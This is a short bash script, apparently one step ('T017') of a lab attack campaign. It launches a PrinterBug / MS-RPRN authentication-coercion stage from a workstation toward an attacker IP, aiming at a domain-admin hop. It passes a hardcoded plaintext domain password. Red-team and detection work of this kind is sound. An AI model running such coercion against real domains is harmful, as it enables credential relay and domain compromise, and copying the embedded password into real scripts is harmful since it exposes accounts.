#!/usr/bin/env bash
# T017 — PrinterBug / MS-RPRN from ws01 as cadre\chief_command (DA hop)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/campaign-a-common.sh"
ATTACK_IP="${1:-192.168.77.60}"
echo "=== T017 PrinterBug | ATTACK_IP=${ATTACK_IP} ==="
campaign_stage_run_ps1 chief_command 'C0mm@nd_Ch1ef!' campaign-a-t017.ps1 cadre.local "-AttackIp ${ATTACK_IP}"
echo "T017 complete"
